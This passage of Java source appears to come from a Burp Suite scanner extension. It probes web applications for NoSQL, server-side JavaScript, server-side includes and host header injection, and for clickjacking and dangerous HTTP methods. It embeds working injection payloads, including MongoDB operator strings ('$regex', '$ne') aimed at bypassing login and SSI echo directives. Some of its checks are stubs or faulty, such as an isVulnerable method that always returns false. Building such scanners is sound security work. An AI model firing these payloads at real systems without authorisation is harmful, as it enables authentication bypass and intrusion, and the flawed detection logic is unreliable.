					new IHttpRequestResponse[]{modifiedRequestResponse4},
					"Host Header Injection Detected",
					"The Host header may be injectable with the payload: " + payload,
					"High",
					"Certain"
			));
		} else if (hasHHI3) {
			issues.add(new CustomScanIssue(
					modifiedRequestResponse5.getHttpService(),
					callbacks.getHelpers().analyzeRequest(modifiedRequestResponse5).getUrl(),
					new IHttpRequestResponse[]{modifiedRequestResponse5},
					"Host Header Injection Detected",
					"The Host header may be injectable with the payload: " + payload,
					"High",
					"Certain"
			));
		}


		this.INJS_ALL.forEach((e) ->
		{
			IHttpRequestResponse[] checkRequestResponse = new IHttpRequestResponse[2];
			IResponseVariations variation = null;

			boolean whole_body_content = false;
			boolean limited_body_content = false;
			boolean status_code = false;
			boolean[] DigYourOwnHole = new boolean[3];
			int DigYourOwnHole_cnt = 0;

			long[] timer = new long[3];
			long[] timerCheck = new long[2];

			if (e.get_payloadType() != INJ_TYPE_JSON_ERROR && e.get_payloadType() != INJ_TYPE_URL_BODY_ERROR)
			{
				byte[] checkRequest1 = insertionPoint.buildRequest(e.get_payload_1());
				byte[] checkRequest2 = insertionPoint.buildRequest(e.get_payload_2());

				if (e.get_payloadType() == INJ_TYPE_TIME) timer[0] = System.currentTimeMillis();
				checkRequestResponse[0] = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest1);
				if (e.get_payloadType() == INJ_TYPE_TIME) timer[1] = System.currentTimeMillis();
				checkRequestResponse[1] = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest2);
				if (e.get_payloadType() == INJ_TYPE_TIME) timer[2] = System.currentTimeMillis();

				if (e.get_payloadType() == INJ_TYPE_TIME)
				{
					timerCheck[0] = timer[1] - timer[0];
					timerCheck[1] = timer[2] - timer[1];
					long timerDiff = Math.abs(timerCheck[1] - timerCheck[0]);

					if (timerDiff >= 10000)
					{
						issues.add(
							new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								helpers.analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[] {baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]},
								"NoSQL/SSJI Time-Based Injection Detected",
								"Injection found by using the following payloads:\n\t" + helpers.bytesToString(e.get_payload_1()) +
										"\nand\n\t" + helpers.bytesToString(e.get_payload_2()) + ".\nThe timing diff was: " + timerDiff + ".",
								"High",
								"Tentative"
							)
						);
					}
				}

				variation = helpers.analyzeResponseVariations(checkRequestResponse[0].getResponse(), checkRequestResponse[1].getResponse());

				// check variation from request1 and request2 responses
				List<String> responseChanges = variation.getVariantAttributes();
				for (String change : responseChanges)
				{
					if (change.equals("whole_body_content")) whole_body_content = true;
					if (change.equals("limited_body_content")) limited_body_content = true;
					if (change.equals("status_code")) status_code = true;
				}

				DigYourOwnHole[0] = (whole_body_content || limited_body_content || status_code);
				DigYourOwnHole_cnt = (whole_body_content ? 1 : 0) + (limited_body_content ? 1 : 0) + (status_code ? 1 : 0);

				if (DigYourOwnHole[0] && DigYourOwnHole_cnt == 3)
				{
					issues.add(
						new CustomScanIssue(
							baseRequestResponse.getHttpService(),
							helpers.analyzeRequest(baseRequestResponse).getUrl(),
							new IHttpRequestResponse[] {baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]},
							((e.get_payloadType() == INJ_TYPE_FUNC) ? "NoSQL/SSJI" : "NoSQL") + " Injection Detected",
							"Injection found, detected by variation in responses, by using the following payloads: " +
									helpers.bytesToString(e.get_payload_1()) + " and " + helpers.bytesToString(e.get_payload_2()),
							"High",
							"Tentative"
						)
					);
				}
				else if (DigYourOwnHole[0]) // if responses are different, check variation about base response
				{
					whole_body_content = limited_body_content = status_code = false;
					variation = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse[0].getResponse());
					responseChanges = variation.getVariantAttributes();
					for (String change : responseChanges)
					{
						if (change.equals("whole_body_content")) whole_body_content = true;
						if (change.equals("limited_body_content")) limited_body_content = true;
						if (change.equals("status_code")) status_code = true;
					}

					DigYourOwnHole[1] = (whole_body_content || limited_body_content || status_code);

					whole_body_content = limited_body_content = status_code = false;
					variation = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse[1].getResponse());
					responseChanges = variation.getVariantAttributes();
					for (String change : responseChanges)
					{
						if (change.equals("whole_body_content")) whole_body_content = true;
						if (change.equals("limited_body_content")) limited_body_content = true;
						if (change.equals("status_code")) status_code = true;
					}

					DigYourOwnHole[2] = (whole_body_content || limited_body_content || status_code);

					boolean check_variation = (DigYourOwnHole[1] != DigYourOwnHole[2]);

					if (check_variation)
					{
						issues.add(
							new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								helpers.analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[] {baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]},
								((e.get_payloadType() == INJ_TYPE_FUNC) ? "NoSQL/SSJI" : "NoSQL") + " Injection Detected",
								"Injection found, detected by variation in responses, by using the following payloads: " +
										helpers.bytesToString(e.get_payload_1()) + " and " + helpers.bytesToString(e.get_payload_2()),
								"High",
								"Tentative"
							)
						);
					}
				}
			}
			else
			{
				if (e.get_err() != null && e.get_err().size() > 0)
				{
					byte[] checkRequest = insertionPoint.buildRequest(e.get_payload_1());
					checkRequestResponse[0] = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);

					byte[] response = checkRequestResponse[0].getResponse();
					final boolean found = false;

					if (response.length > 0)
					{
						Iterator<String> it = e.get_err().iterator();

						while (it.hasNext())
						{
							String err = it.next();

							List<int[]> matches = getMatches(response, err.getBytes());

							if (matches.size() > 0)
							{
								// report the issue
								issues.add(
									new CustomScanIssue(
										baseRequestResponse.getHttpService(),
										helpers.analyzeRequest(checkRequestResponse[0]).getUrl(),
										new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse[0], null, matches) },
										"NoSQL Error Message Detected",
										"The response contains the string: " + err,
										"Medium",
										"Certain"
									)
								);
								break; // stop at first error message detected
							}
						}
					}
				}
			}
		});
		//nosql validation bypass!!

		IHttpRequestResponse attacks = null;
		try{
			// Prepare payloads
			String usernamePayload = "{\"$regex\":\"admin*\"}";
			String passwordPayload = "{\"$ne\":\"test*\"}";

			// Build modified requests with injected payloads
			byte[] modifiedRequest = buildModifiedRequest(baseRequestResponse.getRequest(), insertionPoint, usernamePayload, passwordPayload);

			// Send modified request
			attacks = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest);

			// Check response for indications of vulnerability
			if (!NoSQLInjection) {
				if (isVulnerable(attacks)) {
					issues.add(new CustomScanIssue(
							baseRequestResponse.getHttpService(),
							callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
							new IHttpRequestResponse[]{attacks},
							"NoSQL Injection Detected",
							"The response differs, indicating a possible NoSQL injection",
							"High",
							"Tentative"
					));
				}
			}
		} catch (Exception e) {
			e.printStackTrace();

		}

		// Define combined payloads for MongoDB, CouchDB, and Redis
		String[] combinedPayloads = {
				// MongoDB payloads
				"{\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}}",
				"{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}",
				"{'$gt':'','username':''}",        // Greater Than
				"{'$ne':'','username':''}",        // Not Equal To
				"{'$regex':'','username':''}",     // Regular Expression
				"{\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}}",
				"{'username':{'$regex':'admin*'},'password':{'$ne':'test*'}}",
				"testingTESTINGtesting",

				// CouchDB payloads
				"{\"$gt\":\"\",\"username\":\"\"}",   // Greater Than
				"{\"$ne\":\"\",\"username\":\"\"}",   // Not Equal To
				"{\"$regex\":\"\",\"username\":\"\"}", // Regular Expression

				// Redis payloads
				"*\r\n$4\r\nPING\r\n",   // Ping
				"*\r\n$4\r\nPING\r\n*"   // Ping with wildcard
		};

// Iterate over combined payloads and perform the injection checks
		// Iterate over combined payloads and perform the injection checks
		for (String payloads : combinedPayloads) {
			byte[] NoSQLpayload = payloads.getBytes();
			byte[] request = insertionPoint.buildRequest(NoSQLpayload);
			IHttpRequestResponse attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request);

				// Check if the response time is significantly different
				long startTimeBaseline = System.currentTimeMillis();
				callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), baseRequestResponse.getRequest());
				long endTimeBaseline = System.currentTimeMillis();
				long baselineResponseTime = endTimeBaseline - startTimeBaseline;

				long startTime = System.currentTimeMillis();
				callbacks.makeHttpRequest(attack.getHttpService(), attack.getRequest());
				long endTime = System.currentTimeMillis();
				long responseTime = endTime - startTime;

				long responseDiff = Math.abs(responseTime - baselineResponseTime);
				int THRESHOLD_VALUE = 1200; // --> adjustable

				//IResponseInfo baseResponseInfo = callbacks.getHelpers().analyzeResponse(baseRequestResponse.getResponse());
				IResponseInfo responseInfo = callbacks.getHelpers().analyzeResponse(attack.getResponse());
				int statusCode2 = responseInfo.getStatusCode();
				// Check if the response code is 200 OK
				int responseCode = callbacks.getHelpers().analyzeResponse(attack.getResponse()).getStatusCode();

				if(!NoSQLInjection) {
					if ((responseCode == HttpURLConnection.HTTP_OK || responseDiff > THRESHOLD_VALUE || (statusCode2 >= 300 && statusCode2 < 400))
							&& !Arrays.equals(baseRequestResponse.getResponse(), attack.getResponse())) {
						issues.add(new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[]{attack},
								"NoSQL Injection Detected",
								"The response differs, indicating a possible NoSQL injection using payload: " + payloads,
								"High",
								"Tentative"
						));
						break;
					}
				}
		}
//		byte[] NoSQLpayload2 = "{'$gt':'','username':''}".getBytes();
//		byte[] request = insertionPoint.buildRequest(NoSQLpayload2);
//		IHttpRequestResponse attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request);
//
//		if(!Arrays.equals(baseRequestResponse.getResponse(), attack.getResponse())){
//			issues.add(
//					new CustomScanIssue(
//							baseRequestResponse.getHttpService(),
//							callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
//							new IHttpRequestResponse[]{attack},
//							"NoSQL Injection Detected",
//							"The response differs, indicating a possible NoSQL injection.",
//							"High",
//							"Tentative"
//					)
//			);
//		}

		//CLICKJACKING//
		byte[] response2 = baseRequestResponse.getResponse();
		IResponseInfo responseInfo = callbacks.getHelpers().analyzeResponse(response2);
		List<String> headers = responseInfo.getHeaders();

		boolean xFrameOptionsFound = false;
		for (String header : headers) {
			if (header.toLowerCase().contains("x-frame-options")) {
				xFrameOptionsFound = true;
				if (!header.toLowerCase().contains("deny") && !header.toLowerCase().contains("sameorigin")) {
					// Found X-Frame-Options header without deny or sameorigin directive
					issues.add(
							new CustomScanIssue(
									baseRequestResponse.getHttpService(),
									helpers.analyzeRequest(baseRequestResponse).getUrl(),
									new IHttpRequestResponse[]{baseRequestResponse},
									"Clickjacking Detected",
									"X-Frame-Options HTTP Response Header is set to Deny",
									"High",
									"Certain"
							)
					);
					break;
				}
			}
		}

		if (!xFrameOptionsFound) {
			// X-Frame-Options header not found
			issues.add(
					new CustomScanIssue(
							baseRequestResponse.getHttpService(),
							helpers.analyzeRequest(baseRequestResponse).getUrl(),
							new IHttpRequestResponse[]{baseRequestResponse},
							"Possible Clickjacking Detected",
							"X-Frame-Options HTTP Response Header is hidden (off by default), use SHCheck or other tools to confirm",
							"Information",
							"Tentative"
					)
			);
		}

		//HHI//
//testing//
//		issues.add(
//				new CustomScanIssue(
//						baseRequestResponse.getHttpService(),
//						callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
//						new IHttpRequestResponse[]{baseRequestResponse},
//						"Host Header Injection Detected (INI TESTING)",
//						"The Host header may be injectable with the payload: " + payload,
//						"High",
//						"Certain"
//				)
//		);


		//HTTP METHOD (CONNECT and DELETE)
		processHttpMessage(IBurpExtenderCallbacks.TOOL_PROXY, false, baseRequestResponse);


		//SSI Redirection Check

        if(!insertionPoint.getInsertionPointName().equalsIgnoreCase("PHPSESSID")) {
            byte[] originalResponse = baseRequestResponse.getResponse();
            byte[] payloadSSI1 = "<!--#set var=\"x2\" value=\"SSI INJECTION SUCCESSFUL\"--><!--#echo var=\"x2\"-->".getBytes();
            byte[] payloadSSI2 = "<!--#echo var=\"x2\"-->".getBytes();

            boolean flagSSI = false;

            byte[] requestWithPayload1 = insertionPoint.buildRequest(payloadSSI1);
            byte[] requestWithPayload2 = insertionPoint.buildRequest(payloadSSI2);

            IHttpRequestResponse requestResponseWithPayload1 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), requestWithPayload1);
            IHttpRequestResponse requestResponseWithPayload2 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), requestWithPayload2);

			byte[] responseBodyBytes = requestResponseWithPayload1.getResponse();
			String responseBodyStringOriginal = new String(responseBodyBytes);

            if (responseBodyStringOriginal.toLowerCase().contains("echo var")) {
                return null;
            } else if (responseBodyStringOriginal.toLowerCase().contains("ssi injection successful") || responseBodyStringOriginal.toLowerCase().
					contains("(none)")) {
                issues.add(
                        new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[]{baseRequestResponse, requestResponseWithPayload1},
                                "Server Side Includes Injection Detected",
                                "The page may be injectable with SSI Injection payload: " + new String(payloadSSI1),
                                "High",
                                "Tentative"
                        )
                );
                flagSSI = true;
            }

			byte[] responseBodyBytes2 = requestResponseWithPayload2.getResponse();
			String responseBodyStringOriginal2 = new String(responseBodyBytes2);
            if (responseBodyStringOriginal2.toLowerCase().contains("echo var")) {
                return null;
            } else if (responseBodyStringOriginal2.toLowerCase().contains("ssi injection successful") || responseBodyStringOriginal2.
					toLowerCase().contains("(none)") && !flagSSI) {
                issues.add(
                        new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[]{baseRequestResponse, requestResponseWithPayload2},
                                "Server Side Includes Injection Detected",
                                "The page may be injectable with SSI Injection payload: " + new String(payloadSSI2),
                                "High",
                                "Tentative"
                        )
                );
            }

            if (isRedirection(requestResponseWithPayload1)) {
                issues.add(
                        new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[]{baseRequestResponse, requestResponseWithPayload2},
                                "Page Redirected",
                                "Check the redirected request and response to confirm the passing values and the found vulnerabilities" +
										" if there was any",
                                "Information",
                                "Certain"
                        )
                );
				String newLocation = responseInfo.getHeaders().stream()
						.filter(header -> header.startsWith("Location:"))
						.findFirst()
						.map(header -> header.substring("Location:".length()).trim())
						.orElse(null);
				if (newLocation != null) {
					// Send request to the new location
					IHttpService httpService = baseRequestResponse.getHttpService();

					IRequestInfo originalRequestInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
					String originalURL = originalRequestInfo.getUrl().getPath();

					String basePath = originalURL.substring(0,originalURL.lastIndexOf("/") + 1);

					String httpRequest = "GET " + basePath + newLocation + " HTTP/1.1\r\nHost: " + httpService.getHost() + "\r\n\r\n";
					byte[] request2 = httpRequest.getBytes();
					//callbacks.sendToRepeater(httpService.getHost(), httpService.getPort(), httpService.getProtocol().equals("https"), request, null);
					callbacks.makeHttpRequest(httpService, request2);

					//check for new request
					IHttpRequestResponse requestResponseWithPayloadx = callbacks.makeHttpRequest(httpService, request2);

					byte[] requestBody = requestResponseWithPayloadx.getRequest();

					// Check response body for specific string
					byte[] responseBody = requestResponseWithPayloadx.getResponse();
					String responseBodyString = new String(responseBody);

					if ((responseBodyString.toLowerCase().contains("ssi injection successful") || responseBodyString.toLowerCase().contains("(none)"))
							&& !responseBodyString.contains("<!--#set var=\"x2\" value=\"SSI INJECTION SUCCESSFUL\"-->") &&
							!responseBodyString.contains("<!--#echo var=")){
						// Perform desired action
						issues.add(
								new CustomScanIssue(
										baseRequestResponse.getHttpService(),
										callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
										new IHttpRequestResponse[]{baseRequestResponse, requestResponseWithPayload2},
										"Server Side Includes Injection Detected",
										"The page may be injectable with SSI Injection payload: " + new String(payloadSSI2),
										"High",
										"Certain"
								)
						);
					}
				}
            }
        }

        return issues;
	}
	private byte[] buildModifiedRequest(byte[] request, IScannerInsertionPoint insertionPoint, String usernamePayload, String passwordPayload) {

		// Modify the request with injected payloads
		// Replace the parameter values with the payloads
		String reqStr = new String(request);
		String modifiedReqStr = reqStr.replace("username\":\"\"", "username\":" + usernamePayload)
				.replace("password\":\"\"", "password\":" + passwordPayload);
		return modifiedReqStr.getBytes();
	}

	private boolean isVulnerable(IHttpRequestResponse attack) {
		// Implement response analysis logic to determine vulnerability
		// For example, check if the response differs significantly from the baseline
		return false; // Placeholder
	}
	private boolean checkForInjection(IHttpRequestResponse modifiedRequestResponse, String payload) {
		if (modifiedRequestResponse != null && (hasInjectedHost(modifiedRequestResponse, payload) || hasInjectedHost(modifiedRequestResponse,
				"404 Error - Page Not Found")) ){

			return true;
		} else if (responseContainsPayload(modifiedRequestResponse, payload)) {

			callbacks.addScanIssue(new CustomScanIssue(
					modifiedRequestResponse.getHttpService(),
					callbacks.getHelpers().analyzeRequest(modifiedRequestResponse).getUrl(),
					new IHttpRequestResponse[]{modifiedRequestResponse},
					"Host Header Injection Detected",
					"Response body contains payload (possibly for redirection). The Host header may be injectable with the payload: " +
							payload,
					"High",
					"Tentative"
			));

			return true;
		}
		return false;
	}
	private boolean responseSSI(IHttpRequestResponse requestResponse) {
		byte[] response = requestResponse.getResponse();
		if (response != null) {
			String responseString = callbacks.getHelpers().bytesToString(response);

			IResponseInfo responseInfo = callbacks.getHelpers().analyzeResponse(response);
			int statusCode = responseInfo.getStatusCode();
			boolean isResponse = statusCode >= 200 && statusCode < 400;
            return (responseString.toLowerCase().contains("ssi injection successful") || responseString.toLowerCase().contains("(none)"))  && isResponse;
		}
		return false;
	}
	private boolean isRedirection(IHttpRequestResponse requestResponse) {
		IResponseInfo responseInfo = callbacks.getHelpers().analyzeResponse(requestResponse.getResponse());
		int statusCode = responseInfo.getStatusCode();
		return statusCode == 301 || statusCode == 302 || statusCode == 307 || statusCode == 308 || statusCode == 303;
	}

	private boolean responseContainsString(IHttpRequestResponse requestResponse, String searchString) {
		byte[] response = requestResponse.getResponse();
		if (response != null) {
			String responseString = callbacks.getHelpers().bytesToString(response);
			return responseString.contains(searchString);
		}
		return false;
	}
	private IHttpRequestResponse sendModifiedRequest(IHttpRequestResponse baseRequestResponse, String payload) {
		// Manipulate the Host header and send the modified request
		IHttpRequestResponse modifiedRequestResponse = null;
		byte[] request = baseRequestResponse.getRequest();
		IRequestInfo requestInfo = callbacks.getHelpers().analyzeRequest(request);

		// Replace the Host header with the payload
		List<String> headers = requestInfo.getHeaders();
		for (int i = 0; i < headers.size(); i++) {
			if (headers.get(i).toLowerCase().startsWith("host:")) {
				headers.set(i, "Host: " + payload);

				break;
			}
		}
		byte[] modifiedRequest = callbacks.getHelpers().buildHttpMessage(headers, Arrays.copyOfRange(request, requestInfo.getBodyOffset(),
				request.length));

		// Send the modified request
		try {
			modifiedRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest);
		} catch (Exception e) {
			e.printStackTrace();
		}

		return modifiedRequestResponse;
	}

	private boolean hasInjectedHost(IHttpRequestResponse requestResponse, String payload) {
		// Check if the response indicates successful injection of the Host header
		// You may want to customize this method based on the behavior you're expecting
		// For example, by analyzing the response body or headers

		byte[] responseBody = requestResponse.getResponse();

		if(responseBody == null){
			return false;
		}

		String responseText = callbacks.getHelpers().bytesToString(responseBody);
		return responseText.contains(payload);
	}
	private boolean responseContainsPayload(IHttpRequestResponse requestResponse, String payload) {
		byte[] responseBody = requestResponse.getResponse();

		if (responseBody != null) {
			String responseText = callbacks.getHelpers().bytesToString(responseBody);
			return responseText.contains(payload);
		}
		return false;
	}

	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue)
	{
		return (existingIssue.getIssueName().equals(newIssue.getIssueName())) ? -1 : 0;
	}


	@Override
	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
		if (!messageIsRequest) {
			IHttpService httpService = messageInfo.getHttpService();
			byte[] responseBytes = messageInfo.getResponse();

			// Get the HTTP method used in the request
			IRequestInfo requestInfo = callbacks.getHelpers().analyzeRequest(messageInfo);
			String httpMethod = requestInfo.getMethod();

			// Check if the HTTP method is CONNECT or DELETE
			if (httpMethod.equals("CONNECT") || httpMethod.equals("DELETE")) {
				IResponseInfo responseInfo = callbacks.getHelpers().analyzeResponse(responseBytes);

				// Get the headers from the response
				List<String> responseHeaders = responseInfo.getHeaders();

				// Check if the "Allow" header exists in the response headers
				if (responseHeaders != null && responseHeaders.contains("Allow")) {
					// If CONNECT or DELETE method is allowed, create an issue
					callbacks.addScanIssue(
							new CustomScanIssue(
									httpService,
									requestInfo.getUrl(),
									new IHttpRequestResponse[]{messageInfo},
									"Dangerous HTTP Method Allowed",
									"DELETE or CONNECT HTTP Method allowed",
									"Informational",
									"Certain"
							)
					);
				}
			}
		}
	}

}



// IScanIssue

class CustomScanIssue implements IScanIssue
{
	private IHttpService httpService;
	private URL url;
	private IHttpRequestResponse[] httpMessages;
	private String name;
	private String detail;
	private String severity;
	private String confidence;

	public CustomScanIssue(IHttpService httpService, URL url, IHttpRequestResponse[] httpMessages, String name, String detail, String severity, String confidence)
	{
		this.httpService = httpService;
		this.url = url;
		this.httpMessages = httpMessages;
		this.name = name;
		this.detail = detail;
		this.severity = severity;
		this.confidence = confidence;
	}

	@Override
	public URL getUrl()
	{
		return url;
	}

	@Override
	public String getIssueName()
	{
		return name;
	}

	@Override
	public int getIssueType()
	{
		return 0;
	}

	@Override
	public String getSeverity()
	{
		return severity;
	}

	@Override
	public String getConfidence()
	{
		return confidence;
	}

	@Override
	public String getIssueBackground()
	{
		return null;
	}

	@Override
	public String getRemediationBackground()
	{
		return null;
	}

	@Override
	public String getIssueDetail()
	{
		return detail;
	}

	@Override
	public String getRemediationDetail()
	{
		return null;
	}

	@Override
	public IHttpRequestResponse[] getHttpMessages()
	{
		return httpMessages;
	}

	@Override
	public IHttpService getHttpService()
	{
		return httpService;
	}
}

// InjectionPayload

class InjectionPayload
{
	public byte payloadType;
	public byte[] payload_1;
	public byte[] payload_2;
	public ArrayList<String> err;

	public InjectionPayload(byte t, String p1, String p2, ArrayList<String> err)
	{
		this.payloadType = t;
		set_payloads(p1, p2);
		this.err = err;
	}

	public byte get_payloadType()
	{
		return this.payloadType;
	}

	public byte[] get_payload_1()
	{
		return (this.payload_1 != null) ? this.payload_1 : new byte[0];
	}

	public byte[] get_payload_2()
	{
		return (this.payload_2 != null) ? this.payload_2 : new byte[0];
	}

	public ArrayList<String> get_err()
	{
		return this.err;
	}

	public void set_payloads(String p1, String p2)
	{
		if (p1 != null && p1.length() > 0) this.payload_1 = p1.getBytes();
		if (p2 != null && p2.length() > 0) this.payload_2 = p2.getBytes();
	}
}

